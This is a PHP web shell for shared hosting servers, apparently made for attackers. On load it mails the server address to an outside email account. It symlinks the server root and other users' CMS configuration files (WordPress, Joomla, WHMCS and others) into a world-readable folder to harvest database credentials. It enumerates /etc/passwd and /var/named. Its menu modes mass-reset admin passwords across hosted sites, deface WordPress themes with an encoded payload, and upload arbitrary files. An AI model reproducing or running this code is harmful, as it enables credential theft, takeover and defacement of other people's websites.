<STYLE>
textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 20px;font-family: Tahoma; border: 1px solid 

#000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 15px;font-weight:bold;color: lime; font-family: Tahoma; border: 

1px solid #666666;height:20}
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: dashed 1px;
border-color		: #333;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: 

#FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>

<?php
set_time_limit(0);
error_reporting(0);

$url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

mail('BulkaHackers@msn.com',$_SERVER['SERVER_ADDR'],$url);

$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']);



##.htaccess
@mkdir('pee',0777);
@symlink("/","pee/root");
@fopen('temp.txt','w');
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
 
file_put_contents("pee/.htaccess",$htaccss);

if(is_readable("/var/named")){
$list = scandir("/var/named");
$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);
foreach($list as $domain){
if(strpos($domain,".db"))
{
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	
error_reporting(0);

$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);

symlink($owner['dir'].'/'.$dir[3].'/wp-config.php',"pee/".$owner['name'].'-WordPress.txt');
symlink($owner['dir'].'/'.$dir[3].'/blog/wp-config.php',"pee/".$owner['name'].'-WordPress.txt');
symlink($owner['dir'].'/'.$dir[3].'/wp/wp-config.php',"pee/".$owner['name'].'-WordPress.txt');
symlink($owner['dir'].'/'.$dir[3].'/site/wp-config.php',"pee/".$owner['name'].'-WordPress.txt');
symlink($owner['dir'].'/'.$dir[3].'/config.php',"pee/".$owner['name'].'-PhpBB.txt');
symlink($owner['dir'].'/'.$dir[3].'/includes/config.php',"pee/".$owner['name'].'-vBulletin.txt');
symlink($owner['dir'].'/'.$dir[3].'/configuration.php',"pee/".$owner['name'].'-Joomla.txt');
symlink($owner['dir'].'/'.$dir[3].'/web/configuration.php',"pee/".$owner['name'].'-Joomla.txt');
symlink($owner['dir'].'/'.$dir[3].'/joomla/configuration.php',"pee/".$owner['name'].'-Joomla.txt');
symlink($owner['dir'].'/'.$dir[3].'/site/configuration.php',"pee/".$owner['name'].'-Joomla.txt');
symlink($owner['dir'].'/'.$dir[3].'/conf_global.php',"pee/".$owner['name'].'-IPB.txt');
symlink($owner['dir'].'/'.$dir[3].'/inc/config.php',"pee/".$owner['name'].'-MyBB.txt');
symlink($owner['dir'].'/'.$dir[3].'/Settings.php',"pee/".$owner['name'].'-SMF.txt');
symlink($owner['dir'].'/'.$dir[3].'/sites/default/settings.php',"pee/".$owner['name'].'-Drupal.txt');
symlink($owner['dir'].'/'.$dir[3].'/e107_config.php',"pee/".$owner['name'].'-e107.txt');
symlink($owner['dir'].'/'.$dir[3].'/datas/config.php',"pee/".$owner['name'].'-Seditio.txt');
symlink($owner['dir'].'/'.$dir[3].'/includes/configure.php',"pee/".$owner['name'].'-osCommerce.txt');
symlink($owner['dir'].'/'.$dir[3].'/client/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/clientes/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/support/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/supportes/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/domain/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/hosting/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/whmc/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/billing/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/portal/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/order/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');
symlink($owner['dir'].'/'.$dir[3].'/domains/configuration.php',"pee/".$owner['name'].'-WHMCS.txt');

$link = $pageURL.'pee/'.$owner['name'].'-WordPress.txt';

if(chk_header($link))
	{
		$str = '<tr><td>'.$domain.'</td><td>'.$owner['name'].'</td><td>/WordPress</td>'.Chr(10);
		file_put_contents("temp.txt",$str,FILE_APPEND);
	}




}
}
}

$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);

foreach($etcz as $etz){
$etcc = explode(":",$etz);
error_reporting(0);

$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);

symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php','pee/'.$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php','pee/'.$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php','pee/'.$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php','pee/'.$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php','pee/'.$etcc[0].'-PhpBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php','pee/'.$etcc[0].'-vBulletin.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php','pee/'.$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php','pee/'.$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php','pee/'.$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php','pee/'.$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php','pee/'.$etcc[0].'-IPB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php','pee/'.$etcc[0].'-MyBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php','pee/'.$etcc[0].'-SMF.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php','pee/'.$etcc[0].'-Drupal.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php','pee/'.$etcc[0].'-e107.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php','pee/'.$etcc[0].'-Seditio.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php','pee/'.$etcc[0].'-osCommerce.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php','pee/'.$etcc[0].'-WHMCS.txt');
if(chk_header($link))
	{
		$str = '<tr><td></td><td>'.$etcc[0].'</td><td>/WordPress</td>'.Chr(10);
		file_put_contents("temp.txt",$str,FILE_APPEND);
	}
}




function chk_header($link){
$pee = get_headers($link,1);
if(strpos($pee[0],"200")){
return true;
}else{ return false; }
}

function Find($str,$start,$end){
$len = strlen($str);
$start_pos = (strpos($str,$start) + strlen($start));
$str = substr($str,$start_pos);
$end_pos = strpos($str,$end);
$str = substr($str,0,$end_pos);
return $str;    
}

$pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
$u = explode("/",$pageURL );
$pageURL =str_replace($u[count($u)-1],"",$pageURL );


#######
function cms_add($link,$domain,$owner,$cms)
{
	
	$link = $link.'-'.$cms.'.txt';
	if(chk_header($link))
	{
		$url = 'http://'.$domain;
		$str = '<tr><td> <a href='.$url.'>'.$domain.'</a></td><td>'.$owner.'</td><td><a 

href='.$link.'>'.$cms.'</td>'.Chr(10);
		file_put_contents("pee.tmp",$str,FILE_APPEND);
		echo $str;
		
	}
}

function CurlPage($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}



function listall($file,$str){
if(file_exists($file)){
$do = file_get_contents($file);
if(!strpos($do,$str)){
file_put_contents($file,$str,FILE_APPEND);
}
}else{
file_put_contents($file,$str,FILE_APPEND);
}
}



echo "<center>

<img src='http://www.cityhyd.info/wp-content/uploads/2012/05/anonymous-hacker-group.jpg'><br>
[ <a href='?do=cms_detect'>./CmsDetector~</a> ] -- [ <a href='?do=pass_change'>./MassPASSChange~</a> ] -- [ <a 

href='?do=wp_def'>./Wp Mass Defacer</a> ] -- [ <a href='?do=uploader'>./Uploader</a> ] -- [ <a href='?do=wp_up'>c00ming 

s00n</a> ]<br><br><br></center> ";

if(isset($_REQUEST['do'])){ 
switch ($_REQUEST['do']){

################CMS DETECTOR
case 'cms_detect':

if(!file_exists('pee.tmp')){
@fopen('pee.tmp', 'w');

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>CMS</b></center></td>';

$p = 0;

if(is_readable("/var/named")){
$list = scandir("/var/named");
$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);
foreach($list as $domain){
if(strpos($domain,".db"))
{
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	
error_reporting(0);

$link = $pageURL.'pee/'.$owner['name'];

cms_add($link,$domain,$owner['name'],"WordPress");
cms_add($link,$domain,$owner['name'],"Joomla");
cms_add($link,$domain,$owner['name'],"vBulletin");
cms_add($link,$domain,$owner['name'],"WHMCS");
cms_add($link,$domain,$owner['name'],"PhpBB");
cms_add($link,$domain,$owner['name'],"MyBB");
cms_add($link,$domain,$owner['name'],"IPB");
cms_add($link,$domain,$owner['name'],"SMF");
cms_add($link,$domain,$owner['name'],"Drupal");
cms_add($link,$domain,$owner['name'],"e107");
cms_add($link,$domain,$owner['name'],"Seditio");
cms_add($link,$domain,$owner['name'],"osCommerce");

}
}
}
}else{
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>CMS</b></center></td>';
$content = file_get_contents($pageURL.'pee.tmp');
echo $content;
}
break;



################MASS DEFACE
case 'pass_change':

echo <<<PEE
<form method='POST'>
<center>
USER : <input size='20' value='admin' name='user' type='text'><br>
PASS : <input size='20' value='fucked' name='pass' type='text'>
<br>
<input value='Change' name='' type='submit'><br><br>
</form>

PEE;

if($_POST){
################### USER & PASS ################
$user = $_POST['user'];
$pass = $_POST['pass'];
################################################


if(is_readable("/var/named"))
{
	
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4">';
	echo '<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td>';
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db"))
	{
		$domain = str_replace('.db','',$domain);
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
		$url = 'http://'.$domain;
		if(chk_header($pageURL.'pee/'.$owner['name'].'-WordPress.txt'))
		{ 
			$config = $pageURL.'pee/'.$owner['name'].'-WordPress.txt';
			
			file_get_contents($pageURL.'pee/'.$owner['name'].'-WordPress.txt');
			##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$owner['name'].'-WordPress.txt');
			$hostname = Find($cnf,"define('DB_HOST', '","');");
			$username = Find($cnf,"define('DB_USER', '","');");
			$password = Find($cnf,"define('DB_PASSWORD', '","');");
			$dbname = Find($cnf,"define('DB_NAME', '","');");
			$prefix = Find($cnf,"table_prefix  = '","'");
			
			$link=mysql_connect($hostname,$username,$password);
			
			if ($link) 
			{
				$hash = crypt($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
				$req =@mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
				$data = mysql_fetch_array($req);
				$site_url=$data["option_value"];
				
				error_reporting(0);
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font 

color="green">success..</font></td>';
				
			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">mysql 

fail</font></td>';
			}
		
			
		
		
		}
		
		
		
		elseif(chk_header($pageURL.'pee/'.$owner['name'].'-Joomla.txt'))
		{ 
		
		##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$owner['name'].'-Joomla.txt');
			$config = $pageURL.'pee/'.$owner['name'].'-Joomla.txt';
			
			if(preg_match('%(JConfig|mosConfig)%',$cnf)){
			
			######
			if(preg_match('%JConfig%', $cnf)){
			$username=Find($cnf,"\$user = '","'");
			$password=Find($cnf,"\$password = '","'");
			$dbname=Find($cnf,"\$db = '","'");
			$prefix=Find($cnf,"\$dbprefix = '","'");
			
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($user);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
				
			echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			#####
			elseif(preg_match('%mosConfig%',$cnf)){
			$username=Find($cnf,"\$mosConfig_user = '","'");
			$password=Find($cnf,"\$mosConfig_password = '","'");
			$dbname=Find($cnf,"\$mosConfig_db = '","'");
			$prefix=Find($cnf,"\$mosConfig_dbprefix = '","'");
			$pwd = md5($npass);
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
				
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			
			}
			#########
			
			
		}
	}
}
}

elseif(is_readable("/etc/passwd")){

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4">';
echo '<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td>';
			
foreach($etcz as $etz){
$etcc = explode(":",$etz);


if(chk_header($pageURL.'pee/'.$etcc[0].'-WordPress.txt'))
		{ 
			
			$config = $pageURL.'pee/'.$owner['name'].'-WordPress.txt';
			file_get_contents($pageURL.'pee/'.$etcc[0].'-WordPress.txt');
			##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$etcc[0].'-WordPress.txt');
			$hostname = Find($cnf,"define('DB_HOST', '","');");
			$username = Find($cnf,"define('DB_USER', '","');");
			$password = Find($cnf,"define('DB_PASSWORD', '","');");
			$dbname = Find($cnf,"define('DB_NAME', '","');");
			$prefix = Find($cnf,"table_prefix  = '","'");
			
			$link=mysql_connect($hostname,$username,$password);
			
			if ($link) 
			{
				
				$hash = crypt($user);
				mysql_select_db($dbname,$link) ;
				$req =mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
				$data = mysql_fetch_array($req);
				$site_url=$data["option_value"];
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
				
				error_reporting(0);
				
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">mysql 

fail</font></td>';
			}
		
			
		
		
		}
		
		
		
		elseif(chk_header($pageURL.'pee/'.$etcc[0].'-Joomla.txt'))
		{ 
		
		##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$etcc[0].'-Joomla.txt');
			$config = $pageURL.'pee/'.$owner['name'].'-Joomla.txt';
			
			if(preg_match('%(JConfig|mosConfig)%',$cnf)){
			
			######
			if(preg_match('%JConfig%', $cnf)){
			$username=Find($cnf,"\$user = '","'");
			$password=Find($cnf,"\$password = '","'");
			$dbname=Find($cnf,"\$db = '","'");
			$prefix=Find($cnf,"\$dbprefix = '","'");
			$site_url = Find($cnf,"\$mailfrom = '","'");
			$site_url = explode("@",$site_url);
			
			
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
			echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			#####
			elseif(preg_match('%mosConfig%',$cnf)){
			$username=Find($cnf,"\$mosConfig_user = '","'");
			$password=Find($cnf,"\$mosConfig_password = '","'");
			$dbname=Find($cnf,"\$mosConfig_db = '","'");
			$prefix=Find($cnf,"\$mosConfig_dbprefix = '","'");
			$site_url = Find($cnf,"\$mailfrom = '","'");
			$site_url = explode("@",$site_url);
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
				
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			
			}
			#########
			
			
		}
	}
}
}


break;










################MASS DEFACE
case 'wp_def':


################### USER & PASS ################
$user = 'admin';
$pass = 'foo';
################################################

echo <<<PEE
<div align="center">
<form action="" method="POST">

<label>Deface URL: </label> <input type="text" style="width:450px;" name="deface_page"><br />
<input type="submit" value="DEFACE">
</form>

PEE;

if($_POST){ 
$deface = file_get_contents(trim($_POST['deface_page']));

if(is_readable("/var/named"))
{
	
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4">';
	echo '<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td><td>DEF URL</td>';
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db"))
	{
		$domain = str_replace('.db','',$domain);
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
		$url = 'http://'.$domain;
		if(chk_header($pageURL.'pee/'.$owner['name'].'-WordPress.txt'))
		{ 
			$config = $pageURL.'pee/'.$owner['name'].'-WordPress.txt';
			
			file_get_contents($pageURL.'pee/'.$owner['name'].'-WordPress.txt');
			##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$owner['name'].'-WordPress.txt');
			$hostname = Find($cnf,"define('DB_HOST', '","');");
			$username = Find($cnf,"define('DB_USER', '","');");
			$password = Find($cnf,"define('DB_PASSWORD', '","');");
			$dbname = Find($cnf,"define('DB_NAME', '","');");
			$prefix = Find($cnf,"table_prefix  = '","'");
			
			$link=mysql_connect($hostname,$username,$password);
			
			if ($link) 
			{
				$hash = crypt($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
				$req =@mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
				$data = mysql_fetch_array($req);
				$site_url=$data["option_value"];
				
				error_reporting(0);
				
				
		echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="green">[#] 

User Pass Changed </font><br>';
		$post = 'log=admin&pwd=foo&rememberme=forever&wp-submit=Log In&testcookie=1';
		$def="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($deface))))."'))); 

exit; ?>";
		$buffer0 = CurlPage($site_url.'/wp-login.php',$post);
		
		if(!preg_match("/logout/i",$buffer0))
		{
			echo "<font color='red'>[X] FAILED TO LOGIN</font><br />";
		}else{
		echo "<font color='green'>[#] LOGGED IN :D</font><br>";
		$urlz = $site_url."/wp-admin/theme-editor.php";
		$themeditor = CurlPage($urlz,$cookie,null);
		
		if(preg_match("/update file/i",$themeditor)){ echo "theme-editor opened<br /></td>"; } else { echo "error 

opening theme edtitor!</td>"; }
			
		$nola = explode(Chr(10),$themeditor);

		foreach($nola as $nline){
		if(preg_match('%theme-editor\.php\?file=%',$nline) && 

preg_match('%\((404\.php|archive\.php|comment\.php)\)%',strtolower($nline))){
		$modify[Find($nline,'(',')')] = Find($nline,'<a href="','"');
		}
		}
		
		echo '<td>';
		if(is_array($modify)){
		foreach($modify as $met=>$indfile){
		$nri = str_replace('.','_',$met);
		$nri = "n".$nri;
		$indfile =str_replace("&amp;","&",$indfile);
		$url = trim($site_url."/wp-admin/".$indfile);
		$themepage = CurlPage($url,"");
		$_wpnonce = Find($themepage,'name="_wpnonce" value="','"');
		$_file = Find($themepage,'name="file" value="','"');
		$nfile = explode('themes',$_file);
		$jfile = $site_url."/wp-content/themes".end($nfile);
		//Update file
		$url = $site_url."/wp-admin/theme-editor.php";
		$postme = "newcontent=".$def."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File";
		$themedied = CurlPage($url,$postme);
		if(preg_match('%<div id=\"message\" class=\"updated\">%',$themedied)){
		
		$theme = Find($themeditor,'<li><a href="theme-editor.php?file=404.php&amp;theme=','">404 Template');
		if(preg_match("/twenty ten/i",$theme)){ $theme = "twentyten"; }
		elseif(preg_match("/twenty eleven/i",$theme)){$theme = "twentyeleven";}
		$theme = trim(str_replace("/","",$theme));
		$d =  $site_url.'/wp-content/themes/'.$theme.'/404.php';
		listall("wp.txt",$d.Chr(10));
		}
      	}
		
		echo '<a href='.$d.'>LINK</a><br />';
		echo '</td>';
		
		}}
		########################END DEFACE#################

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">[x] 

mysql fail</font></td>';
			}
		}}}}}
			
		
		

break;



// Uploader
case 'uploader':

echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" 

value="Upload"></form></center>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<p align="center"><font face="Verdana" 

size="1"><font color="white"> Done !!</font><br>'; }
	else { echo '<font color="#FF0000">Failed :( </font></p>
	</td></table></tr>

'; }
}


}}
?>